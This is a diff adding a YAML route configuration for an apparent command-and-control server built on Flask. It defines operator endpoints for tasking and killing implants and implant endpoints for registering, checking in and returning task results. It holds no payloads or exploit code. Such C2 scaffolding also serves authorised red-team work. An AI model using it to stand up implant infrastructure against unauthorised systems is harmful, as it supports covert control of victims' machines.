@@ -1,0 +1,75 @@
+# This file contains the values of different routes for both the operator and C2 listener
+# The values are used to generate the routes for the operator and C2 listener
+# These will all be passed directly to @app.route() in Flask, so any valid Flask route
+# arguments can be used here
+
+operator:
+  # The base path for the operator routes
+  base_path: /op
+
+  # To get the full path for a route, the base path will be prepended to the path
+  list_tasks:
+    path: /tasks/list
+    methods: 
+      - GET
+  
+  add_task:
+    path: /tasks/add
+    methods:
+      - POST
+
+  task_results:
+    path: /tasks/results/<task_id>
+    methods: 
+      - GET
+
+  delete_task:
+    path: /tasks/delete/<task_id>
+    methods:
+      - DELETE
+  
+  list_implants:
+    path: /implants/list
+    methods:
+      - GET
+
+  implant_info:
+    path: /implants/info/<implant_id>
+    methods:
+      - GET
+
+  kill_implant:
+    path: /implants/kill/<implant_id>
+    methods: 
+      - DELETE
+
+  request_auth_token:
+    path: /auth/token/request
+    methods:
+      - GET
+  
+  revoke_auth_token:
+    path: /auth/token/revoke
+    methods:
+      - GET
+
+
+c2:
+
+  base_path: /c2
+
+  # The implant will use this route to register itself with the C2
+  register:
+    path: /register
+    method: POST
+
+  # The implant will use this route to check in with the C2
+  checkin:
+    path: /checkin
+    method: GET
+
+  # The implant will use this route to send results from a task
+  task_results:
+    path: /task/<task_id>
+    method: POST
+
